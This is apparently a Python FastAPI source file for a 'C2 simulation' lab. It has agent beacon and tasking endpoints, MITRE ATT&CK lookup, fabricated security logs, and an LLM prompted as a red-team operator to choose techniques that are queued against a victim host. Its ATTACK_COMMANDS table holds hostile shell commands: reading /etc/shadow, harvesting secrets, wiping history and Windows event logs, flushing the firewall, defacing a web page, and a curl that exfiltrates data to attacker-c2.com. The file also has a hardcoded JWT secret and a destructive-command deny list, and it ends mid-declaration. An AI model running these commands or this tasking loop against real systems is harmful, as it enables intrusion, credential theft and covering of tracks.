from fastapi import FastAPI, HTTPException, Depends
from fastapi.middleware.cors import CORSMiddleware
from fastapi.security import OAuth2PasswordBearer, OAuth2PasswordRequestForm
from fastapi.responses import StreamingResponse, HTMLResponse
from jose import JWTError, jwt
from datetime import datetime, timedelta
import os
import database
import logging
from typing import Optional, Dict, List, Any
import requests
import json
import httpx
import asyncio
import collections
import threading
import random
import psutil
import re

logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

# ── Groq config ──────────────────────────────────────────────
GROQ_API_KEY = os.environ.get("GROQ_API_KEY")
GROQ_MODEL   = os.environ.get("GROQ_MODEL", "llama-3.3-70b-versatile")
GROQ_URL     = "https://api.groq.com/openai/v1/chat/completions"

NAVIGATOR_LAYER_PATH = "/opt/attack-navigator/nav-app/src/assets/layers/c2_live.json"

def is_safe_command(command: str) -> bool:
    if not command or not isinstance(command, str):
        return False
    dangerous = ["rm -rf /", "mkfs", "dd if=", "> /dev/sd", ":(){ :|:& };:", "chmod 777 /"]
    command_lower = command.lower()
    for bad in dangerous:
        if bad in command_lower:
            return False
    if len(command) > 500:
        return False
    return True

# ── APP ──────────────────────────────────────────────────────
app = FastAPI(
    title="C2 Simulation API",
    description="C2 simulation with MITRE ATT&CK, Groq AI, OpenClaw, and APT correlation",
    version="3.1.0"
)

SECRET_KEY = "super-secret-key-change-this-in-production"
ALGORITHM  = "HS256"
ACCESS_TOKEN_EXPIRE_MINUTES = 60

oauth2_scheme = OAuth2PasswordBearer(tokenUrl="token")

# ── PROMPT TEMPLATES ─────────────────────────────────────────
PROMPT_TEMPLATES = {
    "explain_technique": """You are a professional cybersecurity analyst.
Analyze MITRE ATT&CK Technique {technique_id}: {technique_name}
Tactics: {tactics} | Platforms: {platforms}
Description: {description}

Provide: 1) Overview 2) Attacker Motivation 3) Detection Strategy 4) Mitigation
Be concise and actionable.""",

    "analyze_output": """You are a senior red team analyst.
Technique: {technique_id} - {technique_name}
Command: {command}
Output: {output}

Provide: 1) Key Findings 2) Risk Level 3) Attack Path 4) Defender Actions""",

    "threat_hunt": """You are a threat hunting expert.
Techniques observed: {techniques_list}
Timeframe: {timeframe}

Provide: 1) Threat Actor Profile 2) Kill Chain 3) Hunting Hypotheses 4) Data Sources"""
}

# ── GROQ CLIENT ──────────────────────────────────────────────
class GroqClient:
    def __init__(self):
        self.api_key = GROQ_API_KEY
        self.model   = GROQ_MODEL
        self.url     = GROQ_URL
        self.timeout = httpx.Timeout(timeout=30.0)

    def is_available(self):
        return self.api_key is not None

    async def health_check(self):
        return self.is_available()

    async def generate(self, prompt: str, system: str = None,
                       temperature: float = 0.7, max_tokens: int = 300) -> str:
        if not self.api_key:
            return "AI not configured"
        headers = {"Authorization": f"Bearer {self.api_key}", "Content-Type": "application/json"}
        messages = []
        if system:
            messages.append({"role": "system", "content": system})
        messages.append({"role": "user", "content": prompt})
        payload = {"model": self.model, "messages": messages,
                   "temperature": temperature, "max_tokens": max_tokens}
        try:
            async with httpx.AsyncClient(timeout=self.timeout) as client:
                response = await client.post(self.url, headers=headers, json=payload)
                response.raise_for_status()
                return response.json()["choices"][0]["message"]["content"].strip()
        except Exception as e:
            logger.error(f"Groq error: {e}")
            return f"AI error: {str(e)}"

    async def chat(self, messages, temperature: float = 0.7, max_tokens: int = 200):
        if not self.api_key:
            return "AI not configured"
        headers = {"Authorization": f"Bearer {self.api_key}", "Content-Type": "application/json"}
        payload = {"model": self.model, "messages": messages,
                   "temperature": temperature, "max_tokens": max_tokens}
        try:
            async with httpx.AsyncClient(timeout=self.timeout) as client:
                response = await client.post(self.url, headers=headers, json=payload)
                response.raise_for_status()
                return response.json()["choices"][0]["message"]["content"].strip()
        except Exception as e:
            return f"AI error: {str(e)}"

    async def generate_stream(self, prompt: str, system: str = None,
                              temperature: float = 0.7, max_tokens: int = 300):
        if not self.api_key:
            yield "data: {\"token\": \"AI not configured\"}\n\n"
            return
        headers = {"Authorization": f"Bearer {self.api_key}", "Content-Type": "application/json"}
        messages = []
        if system:
            messages.append({"role": "system", "content": system})
        messages.append({"role": "user", "content": prompt})
        payload = {"model": self.model, "messages": messages,
                   "temperature": temperature, "max_tokens": max_tokens, "stream": True}
        try:
            async with httpx.AsyncClient(timeout=self.timeout) as client:
                async with client.stream("POST", self.url, headers=headers, json=payload) as response:
                    async for line in response.aiter_lines():
                        if line and line.startswith("data:"):
                            if line.strip() == "data: [DONE]":
                                yield "data: [DONE]\n\n"
                                break
                            try:
                                data  = json.loads(line[5:])
                                token = data["choices"][0]["delta"].get("content", "")
                                if token:
                                    yield f"data: {json.dumps({'token': token})}\n\n"
                            except Exception:
                                continue
        except Exception as e:
            yield f"data: {{\"token\": \"Stream error: {str(e)}\"}}\n\n"

ai = GroqClient()

# ── MITRE LOCAL CACHE ─────────────────────────────────────────
MITRE_LOCAL_CACHE = {
    "T1053": {"name": "Scheduled Task/Job", "description": "Adversaries may abuse task scheduling.", "tactics": ["execution", "persistence"], "platforms": ["Windows", "Linux", "macOS"], "detection": "Monitor scheduled task creation.", "data_sources": ["File monitoring"], "permissions_required": ["User"]},
    "T1057": {"name": "Process Discovery", "description": "Adversaries may get information about running processes.", "tactics": ["discovery"], "platforms": ["Windows", "Linux", "macOS"], "detection": "Monitor process queries", "data_sources": ["Process monitoring"], "permissions_required": ["User"]},
    "T1082": {"name": "System Information Discovery", "description": "Get detailed OS and hardware info.", "tactics": ["discovery"], "platforms": ["Windows", "Linux", "macOS"], "detection": "Monitor system info commands", "data_sources": ["Process monitoring"], "permissions_required": ["User"]},
    "T1087": {"name": "Account Discovery", "description": "Get listing of accounts.", "tactics": ["discovery"], "platforms": ["Windows", "Linux", "macOS"], "detection": "Monitor account listing commands", "data_sources": ["Process monitoring"], "permissions_required": ["User"]},
    "T1046": {"name": "Network Service Scanning", "description": "Get listing of services on remote hosts.", "tactics": ["discovery"], "platforms": ["Windows", "Linux", "macOS"], "detection": "Monitor network scanning", "data_sources": ["Network monitoring"], "permissions_required": ["User"]},
    "T1016": {"name": "System Network Configuration Discovery", "description": "Look for network configuration details.", "tactics": ["discovery"], "platforms": ["Windows", "Linux", "macOS"], "detection": "Monitor network config commands", "data_sources": ["Process monitoring"], "permissions_required": ["User"]},
    "T1033": {"name": "System Owner/User Discovery", "description": "Identify the primary user.", "tactics": ["discovery"], "platforms": ["Windows", "Linux", "macOS"], "detection": "Monitor whoami commands", "data_sources": ["Process monitoring"], "permissions_required": ["User"]},
    "T1003": {"name": "OS Credential Dumping", "description": "Dump credentials for login.", "tactics": ["credential-access"], "platforms": ["Windows", "Linux"], "detection": "Monitor access to /etc/shadow", "data_sources": ["File monitoring"], "permissions_required": ["Administrator"]},
}

# ── MITRE API ─────────────────────────────────────────────────
class MitreAttackAPI:
    def __init__(self):
        self.techniques        = None
        self.techniques_dict   = {}
        self.using_local_cache = False
        self.github_url  = "https://raw.githubusercontent.com/mitre/cti/master/enterprise-attack/enterprise-attack.json"
        self.cache_file  = "/tmp/mitre_attack_cache.json"

    def load_data(self) -> bool:
        try:
            logger.info("Loading MITRE data from GitHub...")
            response = requests.get(self.github_url, timeout=30)
            response.raise_for_status()
            data = response.json()
            self.techniques      = data["objects"]
            self.techniques_dict = {}
            for obj in self.techniques:
                if obj.get("type") == "attack-pattern":
                    for ref in obj.get("external_references", []):
                        if ref.get("source_name") == "mitre-attack":
                            ext_id = ref.get("external_id")
                            if ext_id:
                                self.techniques_dict[ext_id] = obj
                                break
            logger.info(f"Loaded {len(self.techniques_dict)} techniques from GitHub")
            self.using_local_cache = False
            try:
                with open(self.cache_file, 'w') as f:
                    json.dump(data, f)
            except Exception:
                pass
            return True
        except Exception as e:
            logger.warning(f"GitHub failed: {e}")
        try:
            if os.path.exists(self.cache_file):
                with open(self.cache_file, 'r') as f:
                    data = json.load(f)
                    self.techniques      = data["objects"]
                    self.techniques_dict = {}
                    for obj in self.techniques:
                        if obj.get("type") == "attack-pattern":
                            for ref in obj.get("external_references", []):
                                if ref.get("source_name") == "mitre-attack":
                                    ext_id = ref.get("external_id")
                                    if ext_id:
                                        self.techniques_dict[ext_id] = obj
                                        break
                    self.using_local_cache = False
                    return True
        except Exception as e:
            logger.warning(f"Cache failed: {e}")
        logger.info("Using local MITRE cache")
        self.using_local_cache = True
        self.techniques = []
        return True

    def get_technique(self, technique_code: str) -> Optional[Dict[str, Any]]:
        technique_code = technique_code.upper()
        if not self.using_local_cache and self.techniques_dict:
            if technique_code in self.techniques_dict:
                return self.techniques_dict[technique_code]
            if '.' in technique_code:
                parent = technique_code.split('.')[0]
                if parent in self.techniques_dict:
                    return self.techniques_dict[parent]
        if technique_code in MITRE_LOCAL_CACHE:
            entry = MITRE_LOCAL_CACHE[technique_code].copy()
            entry["external_id"] = technique_code
            return entry
        if '.' in technique_code:
            parent = technique_code.split('.')[0]
            if parent in MITRE_LOCAL_CACHE:
                entry = MITRE_LOCAL_CACHE[parent].copy()
                entry["external_id"] = technique_code
                return entry
        return None

    def format_technique_response(self, technique: Dict[str, Any], requested_code: str = None) -> Dict[str, Any]:
        if self.using_local_cache or "external_id" in technique:
            return technique
        technique_id = requested_code or "Unknown"
        for ref in technique.get("external_references", []):
            if ref.get("source_name") == "mitre-attack":
                technique_id = ref.get("external_id")
                break
        tactics = [p.get("phase_name", "") for p in technique.get("kill_chain_phases", [])]
        return {
            "technique_id":         technique_id,
            "technique_name":       technique.get("name"),
            "description":          technique.get("description"),
            "tactics":              tactics,
            "platforms":            technique.get("x_mitre_platforms", []),
            "detection":            technique.get("x_mitre_detection"),
            "data_sources":         technique.get("x_mitre_data_sources", []),
            "permissions_required": technique.get("x_mitre_permissions_required", [])
        }

    def search_techniques(self, search_term: str) -> List[Dict[str, Any]]:
        search_term = search_term.lower()
        results = []
        if not self.using_local_cache and self.techniques_dict:
            for tech_id, obj in self.techniques_dict.items():
                if search_term in obj.get("name", "").lower() or search_term in obj.get("description", "").lower():
                    results.append({"technique_id": tech_id, "name": obj.get("name"), "description": (obj.get("description") or "")[:200] + "..."})
        for code, data in MITRE_LOCAL_CACHE.items():
            if search_term in data.get("name", "").lower() or search_term in data.get("description", "").lower():
                if not any(r["technique_id"] == code for r in results):
                    results.append({"technique_id": code, "name": data.get("name"), "description": (data.get("description") or "")[:200] + "..."})
        return results[:20]

    def get_statistics(self) -> Dict[str, Any]:
        if self.using_local_cache:
            return {"source": "local_cache", "technique_count": len(MITRE_LOCAL_CACHE), "techniques": list(MITRE_LOCAL_CACHE.keys())}
        tactics_count = {}
        for obj in self.techniques_dict.values():
            for phase in obj.get("kill_chain_phases", []):
                tactic = phase.get("phase_name", "")
                tactics_count[tactic] = tactics_count.get(tactic, 0) + 1
        return {"source": "github_stix", "technique_count": len(self.techniques_dict), "tactics_count": len(tactics_count), "tactics_breakdown": tactics_count}

mitre = MitreAttackAPI()

# ── APT CORRELATOR ────────────────────────────────────────────
class APTCorrelator:
    def __init__(self):
        self.groups: Dict[str, Dict] = {}
        self.loaded = False
        self._lock  = threading.Lock()

    def load_from_stix(self, stix_objects: List[Dict]) -> int:
        if not stix_objects:
            return 0
        tech_id_map: Dict[str, str] = {}
        for obj in stix_objects:
            if obj.get("type") == "attack-pattern":
                stix_id = obj.get("id", "")
                for ref in obj.get("external_references", []):
                    if ref.get("source_name") == "mitre-attack":
                        tech_id_map[stix_id] = ref["external_id"]
                        break
        raw_groups: Dict[str, Dict] = {}
        for obj in stix_objects:
            if obj.get("type") == "intrusion-set":
                gid    = obj.get("id", "")
                name   = obj.get("name", "Unknown")
                ext_id = ""
                for ref in obj.get("external_references", []):
                    if ref.get("source_name") == "mitre-attack":
                        ext_id = ref.get("external_id", "")
                        break
                raw_groups[gid] = {"stix_id": gid, "group_id": ext_id, "name": name,
                                   "aliases": obj.get("aliases", [name]), "techniques": set(),
                                   "description": obj.get("description", "")}
        for obj in stix_objects:
            if obj.get("type") == "relationship" and obj.get("relationship_type") == "uses":
                src = obj.get("source_ref", "")
                tgt = obj.get("target_ref", "")
                if src in raw_groups and tgt in tech_id_map:
                    raw_groups[src]["techniques"].add(tech_id_map[tgt])
        with self._lock:
            self.groups = {}
            for g in raw_groups.values():
                if g["techniques"]:
                    g["techniques"] = list(g["techniques"])
                    self.groups[g["name"]] = g
            self.loaded = True
        logger.info(f"APTCorrelator: loaded {len(self.groups)} groups")
        return len(self.groups)

    def correlate(self, executed: List[str]) -> List[Dict]:
        if not executed:
            return []
        executed_set = {t.upper() for t in executed}
        executed_set |= {t.split(".")[0] for t in executed_set}
        results = []
        with self._lock:
            for group in self.groups.values():
                group_techs = set(group["techniques"])
                matched     = executed_set & group_techs
                if not matched:
                    continue
                total = len(group_techs)
                results.append({
                    "name":               group["name"],
                    "group_id":           group["group_id"],
                    "aliases":            group["aliases"],
                    "overlap_count":      len(matched),
                    "group_total":        total,
                    "score_pct":          round(len(matched) / total * 100, 1),
                    "matched_techniques": sorted(matched),
                    "description":        (group.get("description") or "")[:300],
                })
        results.sort(key=lambda x: (x["overlap_count"], x["score_pct"]), reverse=True)
        return results

apt_correlator = APTCorrelator()

# ── STATE ─────────────────────────────────────────────────────
EXECUTED_TECHNIQUES: Dict[str, Dict] = {}
EXECUTED_LOCK = threading.Lock()
TASK_QUEUE    = {}
OUTPUT_QUEUE  = {}
AGENTS        = {}
VICTIM_NAME   = "websecsim-victim-c2"
GOALS         = {}
LOG_STORE     = collections.deque(maxlen=500)
LOG_LOCK      = threading.Lock()

FAKE_IPS     = ["185.220.101.47", "45.142.212.100", "198.51.100.23", "203.0.113.77", "91.108.4.1"]
INTERNAL_IPS = ["10.0.0.1", "10.0.0.2", "192.168.1.1", "172.16.0.5"]
AUTH_USERS   = ["root", "admin", "ubuntu", "pi", "guest", "operator"]
FILE_PATHS   = ["/etc/passwd", "/etc/shadow", "/root/.ssh/authorized_keys", "/tmp/.hidden", "/var/log/auth.log", "/etc/crontab"]

def record_executed_technique(technique_id: str, output: str = "", host: str = ""):
    tid = technique_id.upper().strip()
    ts  = datetime.utcnow().isoformat() + "Z"
    with EXECUTED_LOCK:
        if tid not in EXECUTED_TECHNIQUES:
            EXECUTED_TECHNIQUES[tid] = {"technique_id": tid, "first_seen": ts, "last_seen": ts, "count": 0, "hosts": set(), "outputs": []}
        entry = EXECUTED_TECHNIQUES[tid]
        entry["count"]    += 1
        entry["last_seen"] = ts
        entry["hosts"].add(host)
        if output:
            entry["outputs"].append({"ts": ts, "snippet": output[:300]})

def push_log(category: str, level: str, source: str, message: str, details: dict = None):
    entry = {"id": len(LOG_STORE), "ts": datetime.utcnow().isoformat() + "Z",
             "category": category, "level": level, "source": source, "msg": message, "details": details or {}}
    with LOG_LOCK:
        LOG_STORE.append(entry)

def build_navigator_layer(executed: Dict[str, Dict], layer_name: str = "C2 Simulation", description: str = "Auto-generated") -> Dict:
    COLOR_SCALE = ["#ffffb2", "#fecc5c", "#fd8d3c", "#f03b20", "#bd0026"]
    def pick_color(count: int) -> str:
        return COLOR_SCALE[min(count - 1, len(COLOR_SCALE) - 1)]
    with EXECUTED_LOCK:
        items = list(executed.items())
    technique_entries = []
    for tid, info in items:
        hosts_list = list(info["hosts"]) if isinstance(info["hosts"], set) else info["hosts"]
        technique_entries.append({
            "techniqueID": tid, "score": info["count"], "color": pick_color(info["count"]),
            "comment": f"Executed {info['count']} time(s). Hosts: {', '.join(hosts_list) or 'unknown'}.",
            "enabled": True, "showSubtechniques": True,
        })
    max_score = max((info["count"] for _, info in items), default=1)
    return {
        "name": layer_name, "versions": {"attack": "14", "navigator": "4.9", "layer": "4.5"},
        "domain": "enterprise-attack", "description": description,
        "filters": {"platforms": ["Linux", "macOS", "Windows", "Network", "PRE", "Containers"]},
        "sorting": 3, "layout": {"layout": "side", "aggregateFunction": "max", "showID": True, "showName": True, "showAggregateScores": True, "countUnscored": False},
        "hideDisabled": False, "techniques": technique_entries,
        "gradient": {"colors": ["#ffffb2", "#bd0026"], "minValue": 1, "maxValue": max_score},
        "legendItems": [{"label": "Executed once", "color": "#ffffb2"}, {"label": "Executed 5+ times", "color": "#bd0026"}],
        "metadata": [], "links": [], "showTacticRowBackground": True, "tacticRowBackground": "#dddddd",
        "selectTechniquesAcrossTactics": True, "selectSubtechniquesWithParent": False, "selectVisibleTechniques": False,
    }

# ── BACKGROUND TASKS ──────────────────────────────────────────
async def log_system_metrics():
    while True:
        try:
            cpu = psutil.cpu_percent(interval=1)
            mem = psutil.virtual_memory()
            push_log("system", "info", "sysmon", f"CPU {cpu:.1f}% | MEM {mem.percent:.1f}% ({mem.used//1024//1024}MB/{mem.total//1024//1024}MB)", {"cpu_pct": cpu, "mem_pct": mem.percent})
            if cpu > 75:
                push_log("system", "warn", "sysmon", f"HIGH CPU: {cpu:.1f}%", {"cpu_pct": cpu})
        except Exception as e:
            push_log("system", "warn", "sysmon", f"Metrics error: {e}")
        await asyncio.sleep(10)

async def log_security_events():
    while True:
        try:
            r = random.random()
            if r < 0.25:
                user = random.choice(AUTH_USERS)
                ip   = random.choice(FAKE_IPS + INTERNAL_IPS)
                push_log("security", "warn", "auth", f"Failed SSH login for '{user}' from {ip}", {"user": user, "src_ip": ip})
            elif r < 0.40:
                push_log("security", "alert", "sudo", f"Privilege escalation: sudo by uid={random.randint(1000,1100)}", {"uid": random.randint(1000,1100)})
            elif r < 0.50:
                push_log("security", "info", "auth", f"Successful login: user='admin' via ssh", {"method": "publickey"})
            elif r < 0.55:
                push_log("security", "critical", "pam", f"Multiple auth failures — brute force from {random.choice(FAKE_IPS)}", {"attempts": random.randint(5,30)})
            else:
                push_log("security", "info", "auditd", f"Audit: process={random.choice(['cron','systemd','bash'])} uid={random.randint(0,1000)}", {})
        except Exception as e:
            push_log("security", "warn", "auth", f"Security log error: {e}")
        await asyncio.sleep(random.uniform(5, 15))

async def log_network_events():
    while True:
        try:
            r        = random.random()
            src_ip   = random.choice(INTERNAL_IPS)
            dst_ip   = random.choice(FAKE_IPS + INTERNAL_IPS)
            dst_port = random.choice([22, 80, 443, 4444, 8080, 3389, 1337, 53, 445])
            proto    = "TCP" if dst_port != 53 else "UDP"
            if dst_port in [4444, 1337, 8080] and r < 0.4:
                push_log("network", "alert", "netstat", f"Suspicious outbound {proto} {src_ip} -> {dst_ip}:{dst_port}", {"src": src_ip, "dst": dst_ip, "dst_port": dst_port})
            elif r < 0.3:
                push_log("network", "warn", "netstat", f"New connection {src_ip} -> {dst_ip}:{dst_port}", {"src": src_ip, "dst": dst_ip})
            elif r < 0.5:
                push_log("network", "info", "netstat", f"DNS query -> {random.choice(FAKE_IPS)}", {"type": "DNS"})
            else:
                push_log("network", "info", "netstat", f"Port scan: {random.choice(FAKE_IPS)} scanned {random.randint(10,100)} ports", {})
        except Exception as e:
            push_log("network", "warn", "netstat", f"Network log error: {e}")
        await asyncio.sleep(random.uniform(4, 12))

async def log_filesystem_events():
    while True:
        try:
            r    = random.random()
            path = random.choice(FILE_PATHS)
            proc = random.choice(["bash", "python3", "nc", "curl", "wget", "cron", "systemd"])
            uid  = random.choice([0, random.randint(1000, 1100)])
            if "/etc/shadow" in path or "/root/.ssh" in path:
                push_log("filesystem", "critical", "inotify", f"Sensitive file accessed: {path} by {proc} (uid={uid})", {"path": path, "process": proc, "uid": uid})
            elif "/tmp/.hidden" in path or r < 0.15:
                push_log("filesystem", "alert", "inotify", f"Hidden file modified: {path} by {proc}", {"path": path, "process": proc})
            elif r < 0.35:
                push_log("filesystem", "warn", "inotify", f"Config modified: {path} (uid={uid})", {"path": path})
            else:
                push_log("filesystem", "info", "inotify", f"File read: {path} by {proc}", {"path": path})
        except Exception as e:
            push_log("filesystem", "warn", "inotify", f"FS log error: {e}")
        await asyncio.sleep(random.uniform(6, 18))

async def log_attack_correlation(technique: str, output: str):
    attack_logs = {
        "T1003": [("security","critical","lsass","LSASS memory read — credential dumping attempt"), ("filesystem","critical","inotify","SAM database accessed")],
        "T1082": [("system","warn","auditd","System enumeration: uname, hostname, id"), ("security","warn","auditd","Reconnaissance: /etc/os-release read")],
        "T1053": [("filesystem","alert","inotify","Crontab modified — new scheduled task"), ("security","alert","crond","Scheduled task created by non-root")],
        "T1041": [("network","critical","netstat","Data exfiltration over C2 channel detected"), ("network","alert","netstat","Unusual outbound data volume")],
    }
    entries = attack_logs.get(technique, [("security","alert","sysmon",f"Attack technique {technique} executed on victim host")])
    for cat, lvl, src, msg in entries:
        push_log(cat, lvl, src, msg, {"technique": technique, "correlated": True})
        await asyncio.sleep(0.5)

async def auto_save_navigator_layer(interval_seconds: int = 30):
    while True:
        await asyncio.sleep(interval_seconds)
        try:
            parent = os.path.dirname(NAVIGATOR_LAYER_PATH)
            if parent and os.path.isdir(parent):
                with EXECUTED_LOCK:
                    layer = build_navigator_layer(EXECUTED_TECHNIQUES, "C2 Live Session", f"Auto-updated {datetime.utcnow().isoformat()}Z")
                with open(NAVIGATOR_LAYER_PATH, "w") as f:
                    json.dump(layer, f, indent=2)
        except Exception as e:
            logger.warning(f"Navigator auto-save failed: {e}")

# ── CORS ──────────────────────────────────────────────────────
app.add_middleware(CORSMiddleware, allow_origins=["*"], allow_methods=["*"], allow_headers=["*"])

# ── AUTH ──────────────────────────────────────────────────────
def create_access_token(data: dict):
    to_encode = data.copy()
    expire    = datetime.utcnow() + timedelta(minutes=ACCESS_TOKEN_EXPIRE_MINUTES)
    to_encode.update({"exp": expire})
    return jwt.encode(to_encode, SECRET_KEY, algorithm=ALGORITHM)

async def get_current_user(token: str = Depends(oauth2_scheme)):
    try:
        payload = jwt.decode(token, SECRET_KEY, algorithms=[ALGORITHM])
        return {"username": payload.get("sub"), "role": payload.get("role")}
    except JWTError:
        raise HTTPException(status_code=401, detail="Invalid token")

# ── KEY FIX: Run bcrypt in thread pool to avoid blocking event loop ──
@app.post("/token")
async def login(form_data: OAuth2PasswordRequestForm = Depends()):
    import concurrent.futures
    loop = asyncio.get_event_loop()
    
    # Run database calls in thread pool so they don't block async loop
    with concurrent.futures.ThreadPoolExecutor() as pool:
        user_data = await loop.run_in_executor(pool, database.get_user, form_data.username)
    
    if not user_data:
        raise HTTPException(status_code=400, detail="Incorrect username or password")
    
    db_username, db_hash, db_role = user_data
    
    with concurrent.futures.ThreadPoolExecutor() as pool:
        valid = await loop.run_in_executor(pool, database.verify_password, form_data.password, db_hash)
    
    if not valid:
        raise HTTPException(status_code=400, detail="Incorrect username or password")
    
    token = create_access_token({"sub": db_username, "role": db_role})
    return {"access_token": token, "token_type": "bearer", "role": db_role}

# ── DASHBOARD ─────────────────────────────────────────────────
@app.get("/dashboard")
async def serve_dashboard():
    try:
        with open("/app/dashboard.html", "r", encoding="utf-8") as f:
            html = f.read()
        return HTMLResponse(content=html, status_code=200)
    except FileNotFoundError:
        return HTMLResponse(content="<h1>Dashboard not found — copy dashboard.html to /app/</h1>", status_code=404)
    except Exception as e:
        return HTMLResponse(content=f"<h1>Error: {e}</h1>", status_code=500)

# ── SYSTEM ────────────────────────────────────────────────────
@app.post("/api/system/start")
async def start_system(current_user: dict = Depends(get_current_user)):
    return {"status": "Reverse C2 Active"}

@app.post("/api/system/reset")
async def reset_system(current_user: dict = Depends(get_current_user)):
    TASK_QUEUE.clear()
    OUTPUT_QUEUE.clear()
    with EXECUTED_LOCK:
        EXECUTED_TECHNIQUES.clear()
    return {"status": "reset"}

# ── BEACON ────────────────────────────────────────────────────
@app.post("/c2/beacon")
async def beacon(data: dict):
    host = data.get("host")
    AGENTS[host] = {"last_seen": str(datetime.utcnow())}
    if host not in TASK_QUEUE:
        TASK_QUEUE[host] = []
    if TASK_QUEUE[host]:
        return {"task": TASK_QUEUE[host].pop(0)}
    return {"task": None}

# ── OUTPUT ────────────────────────────────────────────────────
@app.post("/c2/output")
async def receive_output(data: dict):
    host      = data.get("host")
    technique = data.get("technique")
    output    = data.get("output", "")
    if host not in OUTPUT_QUEUE:
        OUTPUT_QUEUE[host] = []
    OUTPUT_QUEUE[host].append({"technique": technique, "output": output, "time": str(datetime.utcnow())})
    if technique:
        record_executed_technique(technique, output, host or "unknown")
        asyncio.create_task(log_attack_correlation(technique, output))
    return {"status": "received"}

# ── AGENTS / OUTPUT ───────────────────────────────────────────
@app.get("/api/output/{host}")
async def get_output(host: str):
    return OUTPUT_QUEUE.get(host, [])

@app.get("/api/agents")
async def get_agents():
    return AGENTS

# ── LOGS ──────────────────────────────────────────────────────
@app.get("/api/logs")
async def get_logs(since_id: int = 0, category: str = None, level: str = None, limit: int = 100):
    with LOG_LOCK:
        entries = list(LOG_STORE)
    if category:
        entries = [e for e in entries if e["category"] == category]
    if level:
        entries = [e for e in entries if e["level"] == level]
    entries = [e for e in entries if e["id"] > since_id]
    return {"logs": entries[-limit:], "total": len(LOG_STORE), "latest_id": entries[-1]["id"] if entries else since_id}

@app.get("/api/logs/stats")
async def get_log_stats():
    with LOG_LOCK:
        entries = list(LOG_STORE)
    stats = {}
    for e in entries:
        stats.setdefault(e["category"], {}).setdefault(e["level"], 0)
        stats[e["category"]][e["level"]] += 1
    return {"stats": stats, "total": len(entries)}

# ── MITRE ─────────────────────────────────────────────────────
@app.get("/api/mitre/stats")
async def mitre_statistics():
    if mitre.techniques is None:
        mitre.load_data()
    return mitre.get_statistics()

@app.get("/api/mitre/search/{search_term}")
async def search_mitre(search_term: str):
    if mitre.techniques is None:
        mitre.load_data()
    results = mitre.search_techniques(search_term)
    return {"search_term": search_term, "count": len(results), "results": results}

@app.get("/api/mitre/test/{t_code}")
async def mitre_test(t_code: str):
    if mitre.techniques is None:
        mitre.load_data()
    technique = mitre.get_technique(t_code)
    return {"status": "MITRE data loaded", "using_github": not mitre.using_local_cache, "technique_found": technique is not None, "technique_data": technique}

@app.get("/api/mitre/{t_code}")
async def mitre_lookup(t_code: str):
    if mitre.techniques is None:
        mitre.load_data()
    technique = mitre.get_technique(t_code)
    if not technique:
        raise HTTPException(status_code=404, detail=f"Technique {t_code} not found")
    return mitre.format_technique_response(technique, t_code)

# ── ATTACK COMMANDS ───────────────────────────────────────────
ATTACK_COMMANDS = {
    "T1057":     "ps aux",
    "T1082":     "uname -a && cat /etc/os-release && uptime",
    "T1087":     "cut -d: -f1 /etc/passwd",
    "T1046":     "ip addr || ifconfig && netstat -tulnp",
    "T1016":     "route -n || ip route",
    "T1033":     "whoami",
    "T1007":     "service --status-all",
    "T1124":     "date",
    "T1069":     "groups",
    "T1012":     "ls -la /etc/",
    "T1083":     "ls -R /home",
    "T1518":     "dpkg -l || rpm -qa",
    "T1003":     "cat /etc/shadow",
    "T1552":     "cat /etc/*.conf 2>/dev/null | grep -iE 'pass|key|secret'",
    "T1555":     "cat ~/.bash_history",
    "T1068":     "find / -perm -4000 2>/dev/null",
    "T1548":     "sudo -l",
    "T1049":     "netstat -an",
    "T1135":     "showmount -e",
    "T1053":     "echo hacked > /tmp/persist.txt",
    "T1053.001": "ls -la /etc/cron*",
    "T1053.003": "crontab -l",
    "T1547":     "echo BOOTED > /tmp/persist_boot.txt",
    "T1505":     "echo 'malicious' >> /var/www/html/index.html",
    "T1005":     "tar czf /tmp/data.tar.gz /etc/passwd /home/ubuntu",
    "T1119":     "find /etc /var/www /tmp -type f | head -n 20",
    "T1070":     "rm -f /root/.bash_history",
    "T1562":     "iptables -F",
    "T1222":     "chmod 777 /etc/passwd",
    "T1105":     "wget http://google.com",
    "T1090":     "curl -s ifconfig.me",
    "T1573":     "openssl version",
    "T1041":     "curl -X POST -d @/tmp/staged_data.tar.gz https://attacker-c2.com/exfil",
    "T1047":     "wmic /node:TARGET process call create \"cmd.exe /c whoami\"",
    "T1070.001": "wevtutil cl System && wevtutil cl Security && wevtutil cl Application",
}

# ── ATTACK ENDPOINTS ──────────────────────────────────────────
@app.get("/api/attack/supported")
async def get_supported_attacks():
    techniques = []
    for code, command in ATTACK_COMMANDS.items():
        mitre_info = mitre.get_technique(code.split('.')[0])
        techniques.append({
            "technique":      code,
            "command":        command,
            "name":           mitre_info.get("name") if mitre_info else "Unknown",
            "has_mitre_info": mitre_info is not None
        })
    return {"count": len(techniques), "techniques": techniques}

@app.post("/api/attack/{t_code}")
async def execute_t_code(t_code: str, current_user: dict = Depends(get_current_user)):
    if current_user["role"] != "admin":
        raise HTTPException(status_code=403, detail="Admins Only")
    if t_code not in ATTACK_COMMANDS:
        raise HTTPException(status_code=404, detail="Technique not supported")
    if VICTIM_NAME not in TASK_QUEUE:
        TASK_QUEUE[VICTIM_NAME] = []
    TASK_QUEUE[VICTIM_NAME].append({"technique": t_code, "command": ATTACK_COMMANDS[t_code]})
    push_log("attack", "alert", "c2", f"Technique {t_code} queued for execution", {"technique": t_code})
    return {"status": "task queued", "technique": t_code}

# ── OPENCLAW GOAL ─────────────────────────────────────────────
@app.post("/api/openclaw/goal")
async def openclaw_goal(data: dict, current_user: dict = Depends(get_current_user)):
    if current_user["role"] != "admin":
        raise HTTPException(status_code=403, detail="Admins Only")
    goal = data.get("goal")
    if not goal:
        raise HTTPException(status_code=400, detail="Goal is required")
    GOALS[VICTIM_NAME] = goal
    prompt = f"You are a red team operator. Goal: {goal}\nGenerate 5 MITRE ATT&CK technique IDs for Ubuntu Linux.\nOutput ONLY comma-separated IDs like: T1057,T1082,T1068,T1003,T1041"
    response = await ai.generate(prompt, temperature=0.3, max_tokens=100)
    techniques = [t.strip() for t in response.split(",") if t.strip() and re.match(r'T\d{4}', t.strip())]
    plan = [t for t in techniques if t in ATTACK_COMMANDS]
    if VICTIM_NAME not in TASK_QUEUE:
        TASK_QUEUE[VICTIM_NAME] = []
    for t in plan:
        TASK_QUEUE[VICTIM_NAME].append({"technique": t, "command": ATTACK_COMMANDS[t], "source": "goal-based"})
    return {"goal": goal, "plan": plan}

@app.get("/api/openclaw/techniques")
